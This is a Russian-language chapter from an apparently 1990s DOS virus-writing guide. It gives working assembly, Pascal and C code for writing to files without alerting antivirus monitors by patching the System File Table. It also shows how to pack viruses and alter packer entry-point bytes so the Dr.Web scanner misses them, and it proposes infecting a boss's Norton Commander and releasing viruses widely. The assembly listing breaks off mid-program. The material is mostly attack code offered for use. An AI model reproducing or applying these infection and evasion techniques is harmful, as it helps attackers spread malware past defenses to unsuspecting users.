    Резидентные антивирусные мониторы, как большие зеленые мухи,
носятся над еще не умершим DOS, поднимая гнусное жужжание при каждой
его конвульсии. Уже и в BIOS пробралась эта мразь, поднимая писк при
попытке записи в MBR винта (такое я видел в Setup'ах некоторых четверок).
Хотя винт-то прийдется когда-нибудь форматить или сами до Setup'a доберемся
- все равно.
    Вот благодаря таким вот мониторам (не путать с телевизорами) и
появились невидимки - более продвинутое поколение - Stealth-вирусов.
Идя навстречу пожеланиям юзеров, пообрывали они жужжалки у этих тварей,
чтобы не мешать спокойно юзверствовать народу. И если загоралась рамочка
с надписью "кто-то пытается что-то", то это только если DOS'у где-то
не сидится. Посему простые юзеры этих мух стали гонять головками по
дискам, и выкидывать к еханой фене.
    Но не о стелс технологии хочу я рассказать вам, а о более простом
способе обхода мониторов. Таком простом, что даже нерезидентным вирусам
подходит.
  Нет ведь у них, нерезидентных, стелзовой защиты, и нет повести
печальнее на свете, когда монитор антивирусный при запуске такого
файла начинает кричать, что все файлы текущего каталога, мол, открываются
для записи. Так же и умереть со страху можно, а порой за компьютером
сидят люди со слабым сердцем. Это ж убийство, понимаешь!
Good user - Dead user! Но мы не агрессоры :-E

    Слышали ли вы когда-нибудь об SFT ? "System File Table", или, в
литературном переводе на совсем русский, -"стол, где система файлы
разделывает". Ну уж если и не стол, тут многие возразят, так таблица
доступа к этому столу.
    Итак, подробнее:

 System File Table содержит такие данные, как начальный кластер файла,
   РЕЖИМ ОТКРЫТИЯ ФАЙЛА, время и дата создания,размер, указатель текущей
позиции и текущицй считанный кластер. (подробнее см. Norton Guide и
HelpPC). Пользуясь этой таблицей, DOS и производит все операции с
файлами. Поэтому необязательно пользоваться такими функциями,
как 42h, 43h, 5700h.

   РЕЖИМ ОТКРЫТИЯ ФАЙЛА - это то, что заносится в AL при использовании
функции 3Dh, и на что ругаются мониторы.

   Не нужно (!!!) открывать файл для записи, или еще круче :( - сначала
для чтения для проверки на зараженность, а потом для записи снова
(есть такие "супер"-вирусы ...)
   Файл открывается ДЛЯ ЧТЕНИЯ! Всем молчать, особенно мониторам!
Потом мы меняем режим открытия, как вы уже догадались, в таблице,
и пишем в файл столько, сколько влезет!

   Итак, как же это реализовать:

 ; --------------------- получаем адрес элемента таблицы, относящейся к
 ;                       данному файлу
   mov bx,FILE_HANDLE    ; в BX - файловый номер
   mov ax,1220h          ; получить номер входа в SFT
   int 2fh
                         ; выход - ES:[DI] - номер входа в SFT ( байт )

   mov bl,ES:[DI]        ; помещаем номер входа в BL
   mov ax,1216h          ; получить адрес элемента SFT для данного файла
   int 2fh
                         ; выход - ES:DI - адрес элемента SFT

 ; теперь меняем режим открытия ( он находится по адресу +2 ) :

   mov es:[di+2],2       ; ставим "чтение и запись"

-D3, к примеру уже больше никогда не будет ругаться (правда, этот
придурок вопит, когда пишешь на дискеты - используется INT 40h для
FAT апдейт)

  Решается еще одна важная проблема - не нужно менять атрибуты
файла - да-да - спокойно пишемся в ReadOnly и Hidden файлы.
  Так что функция 43h DOS вообще не нужна, как, собственно и эти
дурацкие атрибуты.

        Однако этот метод имеет два недостатка. Первый - не работает под
Windows. Посему приходится проверять, активна ли в данный момент
Windows, и если активна - открывать файл как обычно.
        Второй и самый большой ее недостаток - не работает под NetWare.
То есть при попытке обратиться к SFT файлового сервера NetWare выдает
на экран фразочку типа "Эта программа пытается подломить нетварь, но хрен
у нее что выйдет" и обрубает прогу. Так что пользоваться или не пользоваться
данным методом - решать Вам.
        На Паскале эта процедура реализуется следующим образом:


Procedure FOpen(Var _F : File; FName : String; Var Result : Boolean);
Label Quit, OldWay, ViaSFT; { метка Quit для немедленного выхода из
                              процедуры, метка OldWay для перехода
                              на стандартный вариант открытия файлов
                              в Паскале и метка ViaSFT для перехода
                              на открытие файла через SFT }
Var
   Regs : Registers; { для работы с регистрами }

begin
     Result:=True; { считаем, что процедура открытия файла пройдет успешно }

     { Следующая часть определяет, активна ли в данный момент Windows }

     Regs.AX:=$4680;
     Intr($2F,Regs);
     If Regs.AX = 0 Then GoTo OldWay; { Если в AX находится 0 после вызова
                                        int 2fh (мультиплексное прерывание)
                                        с AX равным 4680h, значит, Windows
                                        в данный момент активна в standart
                                        mode - переходим на открытия файла
                                        стандартными паскалевскими средст-
                                        вами }
     Regs.AX:=$1600;                  { Если Windows в standart mode не
                                        обнаружена, проверяем, активна ли
                                        Windows в enchased mode }
     Intr($2F,Regs);
     If Regs.AL in [$00,$01,$80,$FF] Then GoTo ViaSFT; { Если после
      вызова int 2fh с AX равным 1600h в регистре AL оказался ноль,
      или единица, или 80h, или FFh - значит, никакого Windows нет,
      и мы с чистой совестью переходим на открытие файла через SFT }

      { В этом месте происходит открытие файла Паскалевским способом }

OldWay:
     Assign(_F , FName);
     Reset(_F,1);
     If IOResult <> 0 Then Result:=False; { Если была ошибка при
                                            открытии файла, переменной
                                            Result присваеваем False }
     GoTo Quit;                           { И переходим на конец процедуры,
                                            минуя открытие через SFT }

     { А вот в этом месте файл через SFT и открывается }

ViaSFT:
     FName:=FName + #0; { Добавляем к имени файла 0 - конвертируем
                          стоку в ASCIIZ }
     Regs.AX:=$3D00;    { В AX заносим 3D00h (AH = 3Dh - открыть файл,
                          AL = 00h - режим открытия только для чтения )}
     Regs.DX:=Ofs(FName) + 1; { В DS:DX заносим адрес строки с именем }
     Regs.DS:=Seg(FName);     { файла }
     Intr($21 , Regs);        { Вызываем прерывание 21h }
     If Regs.Flags And 1 = 1 Then { Если после выполнения операции
                                    открытия файла установлен Carry
                                    Flag (CF устанавливается при
                                    ошибке), }
      begin
           Result:=False;         { присваиваем Result False }
           Goto Quit;             { и выходим из процедуры - увы, }
      end;                        { открыть файл не получилось }

     { После вызова int 21h с AH = 3Dh мы получаем хэндл файла в
       регистре AX. Хэндл файла в Ассемблере - слово, в Паскале же -
       три слова, поэтому необходимо корректно сообщить Паскалю,
       что файл открыт, то бишь заполнить три слова Паскалевского
       хэндла необходимой для работы информацией. Формат Паскалевского
       хэндла следующий:

                1 слово - хэндл файла, получаемый в AX после выполнения
                          функции 3Dh
                2 слово - точно не помню, сейчас полчаса копал Паскалевс-
                          кий хэлп, но так и не нашел, тем не менее где-то
                          в хэлпе это описано. Насколько я понял, сущест-
                          вуют слова-константы для разных режимов открытия
                          файла. Для read/write это слово - D7B3h, его мы
                          и используем.
                3 слово - длина записи для нетипизированных файлов,
                          то, что Вы ставите вторым параметром в
                          процедуре Reset(F , ?). В этой процедуре
                          автоматически устанавливается в 1.

     { Организуем Паскалевский хэндл }

     MemW[Seg(_F) : Ofs(_F)]:=Regs.AX; { В первое слово хэндла - AX }
     MemW[Seg(_F) : Ofs(_F) + 2]:=$D7B3; { Во второе - D7B3h }
     MemW[Seg(_F) : Ofs(_F) + 4]:=1; { В третье - длину записи }

     { А теперь изменяем режим открытия файла с "только чтение" на
       чтение запись в SFT так, как это было описано выше }

     Regs.BX:=Regs.AX;
     Regs.AX:=$1220;
     Intr($2F , Regs);
     Regs.BL:=Mem[Regs.ES : Regs.DI];
     Regs.AX:=$1216;
     Intr($2F , Regs);
     Mem[Regs.ES : Regs.DI + 2]:=2;

Quit:

end;   { end proc }

        Пример программы, которая, используя процедуру FOpen, открывает
файл, читает из него, выводит на экран считанное и записывает обратно в
файл. Несложно, но для демонстрации работы процедуры покатит.

Uses Dos;
Var
   OurSig  : Array [1..2] Of Char; { Эта и следующая переменная - }
   Ch      : Char;                 { для демонстрации процедуры (см. ниже) }
   OurBody : File;                 { Хэндл }
   Res     : Boolean;              { флаг }

Procedure FOpen(Var _F : File; FName : String; Var Result : Boolean);
Label Quit, OldWay, ViaSFT; { метка Quit для немедленного выхода из
                              процедуры, метка OldWay для перехода
                              на стандартный вариант открытия файлов
                              в Паскале и метка ViaSFT для перехода
                              на открытие файла через SFT }
Var
   Regs : Registers; { для работы с регистрами }

begin
     Result:=True; { считаем, что процедура открытия файла пройдет успешно }

     { Следующая часть определяет, активна ли в данный момент Windows }

     Regs.AX:=$4680;
     Intr($2F,Regs);
     If Regs.AX = 0 Then GoTo OldWay; { Если в AX находится 0 после вызова
                                        int 2fh (мультиплексное прерывание)
                                        с AX равным 4680h, значит, Windows
                                        в данный момент активна в standart
                                        mode - переходим на открытия файла
                                        стандартными паскалевскими средст-
                                        вами}
     Regs.AX:=$1600;                  { Если Windows в standart mode не
                                        обнаружена, проверяем, активна ли
                                        Windows в enchased mode }
     Intr($2F,Regs);
     If Regs.AL in [$00,$01,$80,$FF] Then GoTo ViaSFT; { Если после
      вызова int 2fh с AX равным 1600h в регистре AL оказался ноль,
      или единица, или 80h, или FFh - значит, никакого Windows нет,
      и мы с чистой совестью переходим на открытие файла через SFT }

      { В этом месте происходит открытие файла Паскалевским способом }

OldWay:
     Assign(_F , FName);
     Reset(_F,1);
     If IOResult <> 0 Then Result:=False; { Если была ошибка при
                                            открытии файла, переменной
                                            Result присваеваем False }
     GoTo Quit;                           { И переходим на конец процедуры,
                                            минуя открытие через SFT }

     { А вот в этом месте файл через SFT и открывается }

ViaSFT:
     FName:=FName + #0; { Добавляем к имени файла 0 - конвертируем
                          стоку в ASCIIZ }
     Regs.AX:=$3D00;    { В AX заносим 3D00h (AH = 3Dh - открыть файл,
                          AL = 00h - режим открытия только для чтения )}
     Regs.DX:=Ofs(FName) + 1; { В DS:DX заносим адрес строки с именем }
     Regs.DS:=Seg(FName);     { файла }
     Intr($21 , Regs);        { Вызываем прерывание 21h }
     If Regs.Flags And 1 = 1 Then { Если после выполнения операции
                                    открытия файла установлен Carry
                                    Flag (CF устанавливается при
                                    ошибке), }
      begin
           Result:=False;         { присваиваем Result False }
           Goto Quit;             { и выходим из процедуры - увы, }
      end;                        { открыть файл не получилось }

     { После вызова int 21h с AH = 3Dh мы получаем хэндл файла в
       регистре AX. Хэндл файла в Ассемблере - слово, в Паскале же -
       три слова, поэтому необходимо корректно сообщить Паскалю,
       что файл открыт, то бишь заполнить три слова Паскалевского
       хэндла необходимой для работы информацией. Формат Паскалевского
       хэндла следующий:

                1 слово - хэндл файла, получаемый в AX после выполнения
                          функции 3Dh
                2 слово - точно не помню, сейчас полчаса копал Паскалевс-
                          кий хэлп, но так и не нашел, тем не менее где-то
                          в хэлпе это описано. Насколько я понял, сущест-
                          вуют слова-константы для разных режимов открытия
                          файла. Для read/write это слово - D7B3h, его мы
                          и используем.
                3 слово - длина записи для нетипизированных файлов,
                          то, что Вы ставите вторым параметром в
                          процедуре Reset(F , ?). В этой процедуре
                          автоматически устанавливается в 1.

     { Организуем Паскалевский хэндл }

     MemW[Seg(_F) : Ofs(_F)]:=Regs.AX; { В первое слово хэндла - AX }
     MemW[Seg(_F) : Ofs(_F) + 2]:=$D7B3; { Во второе - D7B3h }
     MemW[Seg(_F) : Ofs(_F) + 4]:=1; { В третье - длину записи }

     { А теперь изменяем режим открытия файла с "только чтение" на
       чтение запись в SFT так, как это было описано выше }

     Regs.BX:=Regs.AX;
     Regs.AX:=$1220;
     Intr($2F , Regs);
     Regs.BL:=Mem[Regs.ES : Regs.DI];
     Regs.AX:=$1216;
     Intr($2F , Regs);
     Mem[Regs.ES : Regs.DI + 2]:=2;

Quit:

end;   { end proc }

begin { * MAIN * }

      FOpen(OurBody,ParamStr(0),Res); { Открываем файл, то есть себя }
      If Not Res Then                 { Если открыть не получилось - }
         begin
          WriteLn('Ошибка открытия файла.');
          Halt;                       { выходим в ДОС }
         end;

      { Если открыли успешно, то считываем в массив OurSig сигнатуру
        EXE-файла (MZ) }

      BlockRead(OurBody,OurSig,2);
      WriteLn(OurSig); { Выводим ее на экран }

      Ch:=OurSig[1];   { Меняем M и Z местами }
      OurSig[1]:=OurSig[2];
      OurSig[2]:=Ch;

      Seek(OurBody,0); { Перемещаем указатель на начало файла }

      BlockWrite(OurBody,OurSig,2); { И вписываем туда "перевернутую"
      сигнатуру. На работу EXE это не влияет, так как MZ представляет
      собой инструкции
                       00000000 4D   M   dec bp
                       00000001 5A   Z   pop dx
      и для ДОС'а последовательности dec bp / pop dx и pop dx / dec bp
      совершенно монопенисуальны, то бишь однохуйственны. Но зато явно
      видно, что процедура работает ;) }

      Close(OurBody); { Закрываем файл }
end.


4. Как уменьшить размер откомпилированного вируса. Использование
   пакощиков EXE-программ. Дополнительные возможности при
   использовании EXE-паковщиков.

        Беда языков высокого уровня в том, что код, выходящий из-под
компиляторов ЯВУ, слишком громоздкий. Если взять избитый пример прог-
раммы - вывод на экран фразы "Hello World!", то на Ассемблере такая
программа займет 21 байт. Hа Паскале же - 1714 байт. Разница явно
ощутимая. То есть вирус наш со всеми прибамбасами занимает килобайт
десять, если не больше.
        Однако эта проблема решается довольно просто - в компьютерном
мире существует масса так называемых "архиваторов исполняемых прог-
рамм" (PkLite, Diet, LZEXE, AinEXE, TinyProg, EXEPack, PGMPack и т.д.).
Эти паковщики архивируют исполняемую программу и дописывают к получивше-
муся архиву программу разархивирования, которая при запуске раскручивает
в памяти упакованную программу и передает ей управление. Программа, ко-
торая разархивирует упакованный файл, обычно занимает в памяти около
3 - 4 килобайт, что никак не влияет на работу упакованной программы.
        Описывать все существующие паковщики не входит в мои планы,
так как алгоритмы их работы в общем-то идентичны. Остановлюсь
подробно на паковщике PkLite - от мне нравится больше всех остальных
и я им пользуюсь.

                                 PKLITE (tm)

                       The Executable File Compressor


     PKLITE is an easy to use file compression program.  It increases
     your valuable disk space by compressing executable files (with
     .EXE and .COM extensions).  PKLITE will compress these executable
     files so they will require much less disk space yet will still
     run normally.

     PKLITE compresses your files much like PKZIP, but it adds a small
     amount of extraction code at the beginning of the executable
     file.  When you run an application that has been compressed with
     PKLITE, the program will automatically be expanded into memory
     and run.  The compressing process does not change the operation
     of the program at all, it merely reduces the disk space required
     to store it.  No additional memory is needed to run most programs
     compressed with PKLITE.

     PKLITE also has the ability to expand your files back to their
     original size.

     PKLITE will run on any IBM PC or compatible with DOS 2.0 or
     higher.  Running a program that has been compressed with PKLITE
     requires a maximum of 4K extra memory overhead to expand the
     application in memory.  Memory available to the application
     remains the same as before it was compressed.

        То бишь проще некуда. Откомпилировали, затем натравили
на полученный EXE-файл PkLite (например, pklite myvirus.exe),
запомнили получившуюся длину, вписали ее в константу VirLen в
исходнике, откомпилировали еще раз и опять PkLite'ом сжали.
        Теперь о дополнительных возможностях при использовании
EXE-паковщиков. Hу, первая - это уменьшение размера буфера для
тела вируса и инфицируемого файла. Меньше памяти будем жрать.
А вот вторая - самая офигенная. Все паковщики имеют определен-
ный идентификатор, по которому определяют, упакована программа
или нет. Для LzEXE это строка LZ??, для Diet - diet, для AINEXE -
AIN? (под знаками вопроса подразумевается любой символ). PkLite
же имеет самую здоровую текстовую сигнатуру - "PKLITE Copr. 1991
PKWARE Inc. All Rights Reserved Not enough memory$" - 67 байт.
Помните метки там всякие, переменные для за/расшифровки и
прочее? При использовании PkLite нет необходимости дописывать
все эти метки и переменные к телу вируса. Ведь строка "PKLITE
Corp. 1991 PKWARE Inc. All Rights Reserved" ничего, кроме
копирайта авторов упаковщика, не несет и на исполнение программы
не влияет. Соответственно если мы используем место, занимаемое
этой строкой в своих нуждах, никто (кроме авторов PkLite ;) в
обиде не будет. То бишь содержим метки зараженности, за/расшиф-
ровщик и прочее в месте, где в теле вируса эта строка расположена.
А дабы не получилось что-то типа "PKLIE Corp. 1991 PKDiSt0rTi0n"
или чего-то в этом роде, то после компиляции и упаковки файла
залазим в EXE-шник Hackers Viewer'ом и забиваем строку "PKLITE..."
каким-либо мусором (кулаком по клаве проведите :). А еще лучше -
при инфицировании файлов постоянно случайным образом изменяйте
строку (как в вирусе Izvrat, который Вы имели возможность видеть
в Части C Пункте 2). Чтобы те, кто будет искать расшифровщик,
слегка помучались. Вот, собсно, и вся теория. Hа практике это
применено в вирусах Dirty Nazi всех поколений, которые присутствуют
в этом руководстве в Части B Пункте 2.2.2 и Части D Пункте 1.
Hу, а научившись файлы упаковывать, давайте позаботимся, чтобы
их никто назад не распаковал.


5. Приемы против распаковки вируса, сжатого EXE-паковщиком.

      Сжатие файла - лучший антиэвристический прием. Если выключить в
 WEB'е проверку упакованых файлов (меню Настройки, пункт
 Параметры, либо просто клавиша F9), то после упаковки самого
 простого вируса программой типа LZEXE WEB этот вирус не
 разглядит.  Даже если это один из 2025 вирусов, известных
 мистеру Данилову на 18 июня 1996 года. Но помогает WEB'у его
 умение "раздевать" файлы, сжатые некоторыми популярными
 упаковщиками.  Давайте допустим, что у нас есть упаковщик,
 которого WEB не знает.  Заражаем Norton Commander любым
 невинным и известным WEB'у вирусом, сжимаем его нашим
 упаковщиком, несем на машину в офис любимого шефа и меняем его
 Norton на наш. Вот смеху то будет!  Каждый день бедняга будет
 этот вирус из памяти удалять, а после перезагрузки - он опять
 на месте.

      И еще одим полезный момент в использовании упаковщиков
 (более важный, чем первый). Допустим, написан свеженький вирус.
 Нужно ему и мир повидать, и себя показать. Естественно, WEB его
 не берет (иначе что это за вирус? Если вы написали вирус,
 который детектируется WEB'ом, и вы не знаете, что с этим
 поделать, смотрите IV #4, файл web.you; IV #5, файлы iv_5.05a и
 iv_5.05b; IV #6, файлы iv_6.04a и iv_6.04b). Некоторые же юзеры
 поганые любят по F3 в EXE-шники соваться, а иногда страшно
 вопят, если в конце файла после текстовых строк находится
 всякая всячина. И моментально стирают такие файлы - без суда и
 следствия.  А после сжатия ничего такого подозрительного они не
 увидят - по крайней мере смеси кода с текстом.  А через
 некоторое время попадет ваш вирус в TOP-2000 паутины, поубивает
 юзер зверька вашего, а в Norton'е-то он никуда не денется. А
 дальше - как в уже описанном варианте. Юзер сам себе диск
 побьет, еще и рад будет - а затем появится новая легенда о
 "вирусе из ниоткуда".

      Я хочу предложить два метода, которые я уже использовал
 для укрытия от WEB'а факта сжатия.  Оба очень просты в
 реализации.

                         ┌────────────┐
                         │МЕТОД ПЕРВЫЙ│
                         └────────────┘

      Сейчас WEB определяет сжатые файлы уже не по текстовой
 строке под заголовком (например, "LZ91" у lzexe, "diet" у ...
 (догадайтесь сами) или "PKLITE Copr. 1990-91 PKWARE Inc. All
 Rights Reserved" у pklite'а).  WEB стал ученым, он сморит в
 корень, то бишь в код. Но тут он своей пресловутой эвристики и
 не использует!  По маске смотрит "гордый воин-мудрец Веб
 Игоревич" ( (cl) by Transformer, iv_5.09b), не хочет думать. И
 не надо!

      Первые исполняемые комманды у файла, сжатого LZEXE, всегда
 такие:

06             PUSH   ES
0E             PUSH   CS
1F             POP    DS

      Поменял я как-то в таком файле последовательность 06 0E 1F
 на 0E 1F 06, в результате получилось:

0E             PUSH   CS
1F             POP    DS
06             PUSH   ES

      То же самое, никак не влияет на исполнение, но WEB
 заткнулся!  Аналогичные изменения можно сделать с файлами,
 сжатыми pklite'ом, diet'ом и "аином". Для "аина" это покаместь
 не актуально, однако время летит...  Вот информация про эти
 упаковщики:

PKLITE:
     Первые исполняемые комманды:

B8 ?? ??         MOV    AX,????
BA ?? ??         MOV    DX,????
05 ?? ??         ADD    AX,????

      Очевидно, можно поменять местами певую тройку байтов со
 второй - смысл не изменится.

AINEXE:
     Первые исполняемые комманды:

A1 02 00         MOV    AX,[0002]
2D ?? ??         SUB    AX,????
8E D0            MOV    SS,AX
BC ?? ??         MOV    SP,????

      Тут, вопреки советам старейшин, не запрещаются прерывания
 при настройке стека. Знаете, почему? Потому что прерывания
 автоматически запрещаются после ЛЮБОГО изменения SS. Ровно на
 одну комманду.  Причем запрещаются ВСЕ прерывания, в том числе
 и int 1 - трассировка.  Этим и пользуется автор известной
 антивирусной программы, используя такие инструкции:

 push ss
 pop ss
 pushf

 для сохранения в стеке истинного состояния регистра флагов, так
 как даже если трассирующая программа отслеживает инструкцию
 pushf и подменяет в стеке регистр флагов, после push ss pop ss
 она не "заметит" pushf. Она вообще не заметит комманды после
 любого изменения ss, типа mov ax,ss mov ss,ax.

      Однако вернемся к нашим баранам. ПОЧТИ безопасно поменять
 местами два байта 8E D0 с тремя BC ?? ?? (почему это может быть
 опасным - догадаться нетрудно), получим код:

 MOV    AX,[0002]
 SUB    AX,????
 MOV    SP,????
 MOV    SS,AX

      Он квази-эквивалентен исходному.

DIET:
      Тут несколько сложнее. Я не придумал, как изменить самые
 первые комманды.  Однако по адресу entryPoint + 0ch находится
 такая последовательность:

9C             PUSHF
06             PUSH   ES
1E             PUSH   DS
57             PUSH   DI
56             PUSH   SI
52             PUSH   DX
51             PUSH   CX
53             PUSH   BX
50             PUSH   AX
0E             PUSH   CS
FC             CLD

     Она эквивалентна следующей:

9C             PUSHF
FC             CLD
06             PUSH   ES
1E             PUSH   DS
57             PUSH   DI
56             PUSH   SI
52             PUSH   DX
51             PUSH   CX
53             PUSH   BX
50             PUSH   AX
0E             PUSH   CS

      Теперь WEB будет молчать, независимо от того, забили ли вы
 "мусором" (не путать с "копом") текстовые строки в начале
 файла, которые указывают на упаковщик.  Я все же советую
 "попортить" и текст (как это описано в упомянутом уже
 iv_1.004), так как в противном случае файлы, даже после
 описаных изменений, будут распаковыватся с помощью стандартных
 распаковщиков (unlzexe для lzexe, diet и pklite могут сами
 распаковывать сжатые ими файлы, а про ainexe я не знаю).

      Описаные или аналогичные изменения могут быть легко
 произведены "вручную", но если кому лень, то он может
 воспользоваться моей "сишной" программой (см. Вырезку 1). Я там
 мало комментировал, но, думаю, смысл ее понятен из
 вышеизложенного.  Компилируется на Turbo C (думаю, Borland C++
 тоже покатит, но, к сожалению, на своей чахлой машине испытать
 не могу).  EXE-шник сначала сожмите (дискету, а тем более
 винчестер - the ukrainian equivalent is гвинчестер - не надо
 мять руками, используйте diet, pklite, lzexe или ainexe), затем
 обработайте программой change, затем домучьте текстовую
 сигнатуру.

════════════════════════════════ Вырезка #1 ════════════════════════════════

/*     ┌──────────────────────────────────────────┐
       │        ┌───────────────────────┐         │
       ├────────┤Change (c) by MrStrange├─────────┤
       │        └───────────────────────┘         │
       └──────────────────────────────────────────┘
*/
#include <stdio.h>
#include <stdlib.h>
#include <io.h>
#include <fcntl.h>
#include <string.h>
#define nmbr    4        /* Количество упаковщиков, которые знает change */
int getftype(int handle,int *where,char *sgn[],int *size);
int myCompare(char *strReal,char *strMask,int size);
void main(int argc,char **argv)
{
  int f,ftype;
  int header[0x1c/2];
  char *help = "The usage is:\n\n"
                "%s filename.ext\n\n"
                "where filename is a file, compressed via pklite, diet, "
                "lzexe or ainexe\n";

  char *names[nmbr] = {"pklite","lzexe","diet","ainexe"};
                                   /* Имена упаковщиков*/
  char *sgn[nmbr] = {"PKLITE","LZ91","diet","AIN2"};/*Их сигнатуры*/
  int where[nmbr] = {30,28,28,32}; /* Смещение (отн. начала файла), где
                                     находятся сигнатуры */
  int off[nmbr] = {0,0,12,0};      /* Для i-того упаковщикова считываем код
                                      по адресу entryPoint+off[i] */
  int readBytes[nmbr] = {6,3,11,11}; /* Количество считываемых байт */

  char buffer[14];  /* Сюда будет считываться заголовок */
  char mask[nmbr][11] ={ {0xb8,0,0,0xba,0,0},{0x06,0x0e,0x1f},
                      {0x9c,0x06,0x1e,0x57,0x56,0x52,0x51,0x53,
                       0x50,0x0e,0xfc},
                      {0xa1,0x02,0x00,0x2d,0x00,0x00,0x8e,0xd0,0xbc,0,0} };
   /* mask[i] - начальный код для i-того упаковщика. 0 символизирует ?? -
      см. процедуру сравнения myCompare */
  int size[nmbr] = {6,4,4,4}; /* Длина сигнатуры */
  char arcname[6];
  long entryPoint;
  int i;

  printf("Change Compressed File, Copyright (c) by MrStrange.
          Produced in Kiev\n\n");
  if(argc<=1){
    printf(help,argv[0]);
    exit(1);
  }

  if (  (f = open(argv[1],O_RDWR|O_BINARY)) == -1){
    printf("%s - unable to open file\n",argv[1]);
    exit(1);
  }
  read(f,(void *)header,0x1c);
  if(header[0] != 0x5a4d){
    printf("%s - not an exe-file\n",argv[1]);
    close(f);
    exit(0);
  }
  if ( (ftype = getftype(f,where,sgn,size)) == -1){
    close(f);
    printf("%s - Not a compressed file\n",argv[1]);
    exit(1);
  }
/*                                                                         */
/*                                                                         */
 entryPoint = header[0x14/2] + ((long)(header[0x16/2] + header[0x8/2]))*0x10;

  lseek(f,entryPoint+off[ftype],SEEK_SET);
  read(f,(void *)buffer,readBytes[ftype]);
  if(myCompare(buffer,mask[ftype],readBytes[ftype])){
    printf("By header %s is %s, but the code doesn't match\n",argv[1],
            names[ftype]);
    exit(1);
  }
  printf("%s is %s by header and by code\n",argv[1],names[ftype]);
  switch(ftype){
    case 0:                     /* PKLITE. */

 /* Меняем последовательность A1 02 00│2D ?? ??│8E D0 BC ?? ??
                             ^        └────┬───┘
                             └─────────────┘

   Получаем:
                      2D ?? ?? A1 02 00 8E D0 BC ?? ?? */

      { /* ФИГУрную дужку ставлю, чтобы можно было определить 2 переменные */
      char a1,a2;

      buffer[0] = 0xba;
      buffer[3] = 0xb8;
      a1 = buffer[1];
      a2 = buffer[2];
      buffer[1] = buffer[4];
      buffer[2] = buffer[5];
      buffer[4] = a1;
      buffer[5] = a2;
      }
      break;
    case 1:                     /* LZEXE */

/*     Меняем 06 0E 1F на 0E 1F 06 */

      buffer[0] = buffer[1];
      buffer[1] = buffer[2];
      buffer[2] = 0x06;                /* Старый buffer[0] */
      break;
    case 2:                     /* DIET */

/* Исходная последовательность:
   9C 06 1E 57 56 52 51 53 50 0E FC
     ^                            │
     └────────────────────────────┘
   На выходе:
   9C FC 06 1E 57 56 52 51 53 50 0E
*/
      for(i = 10;i>=2;i--)
        buffer[i] = buffer[i-1];
      buffer[1] = 0xfc;                /* Старый buffer[10] */
      break;
    case 3:                     /* AINEXE */

/*  На входе:
         A1 02 00 2D ?? ??│8E D0│BC ?? ??  ^
                          └──┬──┘          │
                             └─────────────┘
    На выходе:
         A1 02 00 2D ?? ?? BC ?? ?? 8E D0
*/

      buffer[6] = buffer[8];
      buffer[7] = buffer[9];
      buffer[8] = buffer[10];
      buffer[9] = 0x8e;
      buffer[10] = 0xd0;
   }

  lseek(f,entryPoint+off[ftype],SEEK_SET);
  write(f,(void *)buffer,readBytes[ftype]);
  close(f);
}

int getftype(int f, int *where, char **sgn,int *size)
{
  int i,ftype;
  char possibleName[10];

  for(i = 0,ftype = -1; i<nmbr && ftype == -1;i++){
    lseek(f,(long) where[i],SEEK_SET);
    read(f,(void *)possibleName,size[i]);
    possibleName[size[i]] = 0;
    if(!strcmp(possibleName,sgn[i]))
      ftype = i;
  }
  return ftype;
}
int myCompare(char *strReal,char *strMask,int size)
{
  int cmp,i;

  for(cmp = i = 0;i<size && !cmp;i++){
    if(!strMask[i]) continue;
    if(strMask[i] != strReal[i]) cmp = 1;
  }
  return cmp;
}
══════════════════════════════════════════════════════════════════════════

                         ┌────────────┐
                         │МЕТОД ВТОРОЙ│
                         └────────────┘

      Этот метод более универсальный и еще более простой.
 Исполняемый файл сжимается ЛЮБЫМ упаковщиком.  Затем к нему
 цепляется фрагментик, который ничего не делает, а только
 передает управление программе. WEB при проверке такого файла,
 очевидно, скромно промолчит.  Написать программу, которая
 производила бы такую нехитрую операцию, тривиально. Возьмите
 свой любой вирус, который цепляется к EXE-файлам, уберите ВСЕ
 функции, кроме обеспечения возврата в программу-носитель и
 собственно привязки к файлу - и все.  Кому лень, может
 компильнуть мою программу change2.asm (Вырезка #2): 1. Вырезать
 фрагмент и поместить в файл change2.asm 2. Компилировать в 2
 прохода: tasm change2.asm /m2 tlink change2.obj Использование:
 change2 filename.exe

      Я там сильно не извращался в вводе-выводе и красоты не
 наводил, но ведь не на юзеров-чайников она расчитана! И еще. К
 исполнительному файлу цепляется псевдопроцедура myProc. Вопреки
 сказанному выше, myProc не только передает управление
 программе, но и выводит на экран через девятую функцию DOS
 строку dummySring == "$", т.е.  просто вызывает функцию 9,
 которая ничего не делает. А сделал я это вот по какой причине.
 Есть у меня программка tsup.exe (14KB) (Universal EXE files
 unpacker version 1.01. (C) 1993 Twilight Software Engineering
 and Pirating (TSEP)).  Она мне распковывает exe-файлы, сжатые
 любым упаковщиком, независимо от того, извращен он 1-м или 2-м
 методом или нет. Хорошая штука - рекомендую всем. Но у нее есть
 особенность - она считает, что файл уже распакован полностью,
 если в программе выполняется прерывание - изврат с dummyString
 направлен именно против tsup и ей подобных.

════════════════════════════════ Вырезка #2 ════════════════════════════════

;       ┌───────────────────────────────────────────┐
;       │        ┌────────────────────────┐         │
;       ├────────┤Change2 (c) by MrStrange├─────────┤
;       │        └────────────────────────┘         │
;       └───────────────────────────────────────────┘


               .286
@mov_ax         equ     0b8h
@mov_cx         equ     0b9h
@mov_sp         equ     0bch

MZ              equ     0
PartPag         equ     2
PageCnt         equ     4
RelElements     equ     6
HdrSize         equ     8
MinMem          equ     0ah
MaxMem          equ     0ch
ReloSS          equ     0eh
ExeSP           equ     10h
CheckSum        equ     12h
ExeIP           equ     14h
ReloCS          equ     16h
FirstRel        equ     18h
_code   segment
        assume cs:_code,ds:_code
RdHdr   proc    near
        ; bx - file handle
        ; ds:[si] - buffer of 1ah elements
        ;
        ; OUTPUT: filled ds:[si]. NO ERROR CORRECTION (for simplicity)

        pusha
        mov     ax,4200h
        xor     cx,cx
        xor     dx,dx
        int     21h             ; LSEEK. Pointer to the beginning of the file
        mov     ah,3fh
        mov     dx,si
        mov     cx,1ah
        int     21h             ; Read from file
        popa
        retn
RdHdr   endp

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
start:
        push    cs
        pop     ds
        mov     dx,offset string
        mov     ah,9
        int     21h
        push    es
        pop     ds              ; ds - сегмент PSP
        mov     dx,82h
        mov     ax,3d02h        ; Откроем файл
        int     21h
        jnc     AllRight1       ; Нет ошибки
        mov     dx,offset string1
        jmp     exit            ; Аварийный выход
AllRight1:
